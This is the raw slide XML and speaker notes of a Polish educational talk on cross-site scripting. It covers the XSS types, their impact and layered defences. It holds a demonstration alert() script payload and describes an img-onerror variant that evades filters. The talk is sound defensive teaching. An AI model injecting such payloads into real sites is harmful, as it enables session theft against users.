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embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="IBM Plex Sans" panose="020B0503050203000203" pitchFamily="34" charset="0"/>
      <p:regular r:id="rId21"/>
      <p:bold r:id="rId22"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="JetBrains Mono" panose="020B0604020202020204"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9" d="100"/>
          <a:sy n="159" d="100"/>
        </p:scale>
        <p:origin x="33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4710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Dzień dobry. Przez najbliższe 20 minut opowiem o cross-site scriptingu, czyli XSS – jednej z najstarszych i nadal najczęściej spotykanych podatności aplikacji webowych. Zobaczymy, jak działa, jakie są jego rodzaje i – co najważniejsze – jak się przed nim bronić.</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jest prosty: najpierw definicja i trochę teorii o tym, dlaczego przeglądarka w ogóle pozwala na taki atak. Potem trzy rodzaje XSS z przykładami kodu, skutki, a na koniec najważniejsza część – warstwy obrony i sposoby testowania.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XSS to wstrzyknięcie kodu po stronie klienta. Kluczowe zdanie: dane stają się kodem. Aplikacja bierze coś od użytkownika – parametr URL, komentarz, nazwę profilu – i wstawia to do strony w taki sposób, że przeglądarka interpretuje to jako HTML albo JavaScript. Ofiarą nie jest serwer, tylko inni użytkownicy aplikacji.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Można by pomyśleć, że to problem rozwiązany dawno temu. Nie jest. W rankingu MITRE CWE Top 25 z 2024 roku CWE-79, czyli właśnie XSS, zajął pierwsze miejsce. W OWASP Top 10 XSS jest od lat, obecnie w szerszej kategorii Injection. Mimo nowoczesnych frameworków błąd ciągle wraca – zwłaszcza tam, gdzie programiści omijają mechanizmy ochronne.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Żeby zrozumieć wagę XSS, trzeba pamiętać o Same-Origin Policy. To podstawowy mechanizm bezpieczeństwa przeglądarki: kod ze strony A nie może czytać danych strony B. XSS jest groźny właśnie dlatego, że tę barierę omija – złośliwy skrypt nie przychodzi z obcej domeny, tylko zostaje osadzony w zaufanej stronie. Dla przeglądarki jest nie do odróżnienia od kodu aplikacji.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Klasycznie wyróżniamy trzy rodzaje XSS. Reflected – payload jest odbijany przez serwer w odpowiedzi na konkretne żądanie. Stored – payload zostaje zapisany i atakuje każdego odwiedzającego. DOM-based – cała podatność żyje w kodzie JavaScript po stronie przeglądarki. Przejdźmy przez każdy z nich na przykładzie.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Najprostszy przykład: wyszukiwarka, która wypisuje „Wyniki dla:” i dokleja surowy parametr q. Atakujący wysyła ofierze link, w którym zamiast frazy jest tag script. Serwer posłusznie wstawia go do HTML, a przeglądarka ofiary go wykonuje – w kontekście sklepu, z dostępem do jej sesji. W praktyce payload jest zwykle zakodowany w URL lub ukryty za skracaczem linków, więc ofiara niczego nie zauważy.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Stored XSS jest groźniejszy, bo payload ląduje w bazie danych. Każdy, kto otworzy stronę z komentarzem, uruchamia skrypt – nie trzeba nikogo namawiać do kliknięcia. Zwróćcie uwagę, że payload nie używa tagu script: obrazek z nieistniejącym źródłem i atrybut onerror wystarczą. Dlatego filtry szukające słowa „script” nie działają. Szczególnie niebezpieczne są panele admina – atakujący zostawia payload w formularzu kontaktowym, a uruchamia go administrator z wysokimi uprawnieniami.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DOM-based XSS dzieje się w całości po stronie klienta. Kod JavaScript bierze dane ze źródła, tutaj z fragmentu URL po krzyżyku, i wpycha je do sinka, czyli API, które interpretuje tekst jako HTML lub kod – tutaj innerHTML. Fragment po krzyżyku w ogóle nie jest wysyłany do serwera, więc ani logi, ani WAF tego nie zobaczą. W aplikacjach SPA to dziś bardzo częsty wariant.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Często XSS demonstruje się okienkiem alert, przez co bywa bagatelizowany. Tymczasem skrypt działający w kontekście aplikacji może zrobić praktycznie wszystko, co użytkownik: przejąć sesję, wykonać operacje w jego imieniu, podmienić treść strony na fałszywy formularz logowania pod prawdziwym adresem, nagrywać klawisze. A w skrajnym przypadku – rozprzestrzeniać się sam, co pokażę na następnym slajdzie.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Najsłynniejszy przykład to robak Samy z 2005 roku. Samy Kamkar znalazł stored XSS w profilach MySpace. Każdy, kto odwiedził jego profil, dodawał go do znajomych i – co kluczowe – kopiował kod robaka do własnego profilu. Efekt kuli śnieżnej: ponad milion zainfekowanych profili w mniej niż dobę, a MySpace musiało tymczasowo wyłączyć serwis. Payload był niegroźny, ale pokazał, jak szybko XSS może się rozprzestrzeniać.</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Pierwsza i najważniejsza linia obrony to kodowanie wyjścia zależne od kontekstu. Kluczowe słowo: kontekst. To, co jest bezpieczne w treści HTML, nie jest bezpieczne w atrybucie, URL-u czy wewnątrz skryptu. Przykład: encje HTML nie ochronią linku z javascript: w atrybucie href. Zasada: koduj w momencie wstawiania danych do wyjścia, nie przy zapisie do bazy, i nie pisz własnych funkcji – używaj sprawdzonych bibliotek. Szczegóły są w OWASP XSS Prevention Cheat Sheet.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Dobra wiadomość: współczesne frameworki robią kodowanie za nas. Jeśli w React piszecie nawias klamrowy z danymi, React je zakoduje. Problem zaczyna się tam, gdzie tę ochronę obchodzimy: dangerouslySetInnerHTML, v-html w Vue, bypassSecurityTrust w Angularze, filtr safe w szablonach. Każde takie miejsce warto traktować jak czerwoną flagę w code review. Jeśli naprawdę trzeba wyrenderować HTML od użytkownika, np. z edytora WYSIWYG, sanityzujemy go sprawdzoną biblioteką, jak DOMPurify – nigdy własnym regexem.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Security Policy to nagłówek, którym mówimy przeglądarce, jakie skrypty wolno uruchomić. Najskuteczniejsza jest tzw. strict CSP oparta na nonce: każdy legalny skrypt dostaje losowy, jednorazowy token, a wszystko bez tokenu – w tym wstrzyknięty kod – jest blokowane. To druga linia obrony: jeśli przeoczymy błąd w kodowaniu, CSP może go zneutralizować. Wdrażanie zaczynamy od trybu Content-Security-Policy-Report-Only, żeby zobaczyć, co by się zepsuło, zanim zaczniemy blokować.</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Kilka dodatkowych warstw. Flaga HttpOnly sprawia, że skrypt nie odczyta ciasteczka sesji – atakujący nadal może działać w przeglądarce ofiary, ale nie wyniesie jej sesji na zewnątrz. Trusted Types to stosunkowo nowy mechanizm, który blokuje przekazywanie zwykłych stringów do niebezpiecznych sinków – świetnie sprawdza się przeciw DOM XSS w dużych aplikacjach. I walidacja wejścia: przydatna, ale nigdy jako jedyna ochrona – tekst może być całkowicie poprawny biznesowo i jednocześnie złośliwy w HTML.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Jak znaleźć XSS, zanim zrobi to ktoś inny? Po pierwsze code review – wyszukujemy w repozytorium niebezpieczne sinki, to szybko daje listę miejsc do sprawdzenia. Po drugie testy ręczne: wpisujemy unikalny ciąg ze znakami specjalnymi i patrzymy w źródło strony, czy wrócił zakodowany i w jakim kontekście. Po trzecie narzędzia – proxy typu Burp czy ZAP oraz automaty w CI. I bardzo ważne: testujemy tylko to, do czego mamy uprawnienia.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Podsumowując cztery rzeczy do zapamiętania. Pierwsza: XSS to sytuacja, w której dane stają się kodem. Druga: podstawą obrony jest kodowanie wyjścia zgodne z kontekstem, a frameworki robią to za nas, jeśli im nie przeszkadzamy. Trzecia: każde miejsce, w którym tę ochronę wyłączamy, wymaga szczególnej uwagi. Czwarta: budujemy obronę warstwowo – CSP, HttpOnly i Trusted Types ratują nas, gdy coś przeoczymy.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Dziękuję za uwagę. Jeśli chcecie zgłębić temat, polecam ściągawki OWASP o zapobieganiu XSS oraz darmowe laboratoria PortSwigger Web Security Academy, gdzie można bezpiecznie i legalnie poćwiczyć. Chętnie odpowiem na pytania.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41"/>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B1D22"/>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89621"/>
            <a:ext cx="10566400" cy="4155579"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>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41"/>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B1D22"/>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89621"/>
            <a:ext cx="10566400" cy="4155579"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>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71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8A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;alert('XSS')&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2091730"/>
            <a:ext cx="10883392" cy="1785541"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="6930"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6600" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cross-Site</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="6930"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6600" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Scripting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="4105870"/>
            <a:ext cx="784860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9B6AE"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Jak działa, dlaczego wciąż jest groźny i jak skutecznie się przed nim bronić</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>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pl-PL" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8E8B84"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Adam Minior Antoni Pietraszewski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Plan prezentacji</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1678880"/>
            <a:ext cx="1991320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C4561F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1894780"/>
            <a:ext cx="205106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4561F"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2245221"/>
            <a:ext cx="205106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Czym jest XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2621062"/>
            <a:ext cx="205106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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Definicja i Same-Origin Policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2956520" y="1678880"/>
            <a:ext cx="1991320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C4561F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2956520" y="1894780"/>
            <a:ext cx="205106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4561F"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2956520" y="2245221"/>
            <a:ext cx="205106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Rodzaje</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2956520" y="2621062"/>
            <a:ext cx="205106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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflected, Stored, DOM-based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5100241" y="1678880"/>
            <a:ext cx="1991420" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C4561F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5100241" y="1894780"/>
            <a:ext cx="205116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4561F"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5100241" y="2245221"/>
            <a:ext cx="205116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Skutki</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5100241" y="2621062"/>
            <a:ext cx="205116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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Co może zrobić atakujący</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7244060" y="1678880"/>
            <a:ext cx="1991320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C4561F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7244060" y="1894780"/>
            <a:ext cx="205106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4561F"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7244060" y="2245221"/>
            <a:ext cx="205106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Obrona</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7244060" y="2621062"/>
            <a:ext cx="205106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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Kodowanie, bezpieczne API, CSP, ciasteczka</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9387780" y="1678880"/>
            <a:ext cx="1991420" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C4561F"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9387780" y="1894780"/>
            <a:ext cx="205116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4561F"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9387780" y="2245221"/>
            <a:ext cx="205116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Testowanie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9387780" y="2621062"/>
            <a:ext cx="205116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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Jak szukać XSS we własnym kodzie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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171C"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="173742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F08A4B"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CZYM JEST XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2291060"/>
            <a:ext cx="10203180" cy="17780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ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Atakujący wstrzykuje własny skrypt do strony, a przeglądarka ofiary wykonuje go tak, jakby pochodził z zaufanej aplikacji.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="4348460"/>
            <a:ext cx="850265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6AE"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Źródło problemu: dane od użytkownika trafiają do HTML lub JavaScriptu bez odpowiedniego kodowania czy sanityzacji – dane stają się kodem.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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E8B84"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cross-Site Scripting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Dlaczego to wciąż ważne</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1669355"/>
            <a:ext cx="3380284" cy="2667794"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3689"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123950" y="1977330"/>
            <a:ext cx="2847264"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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
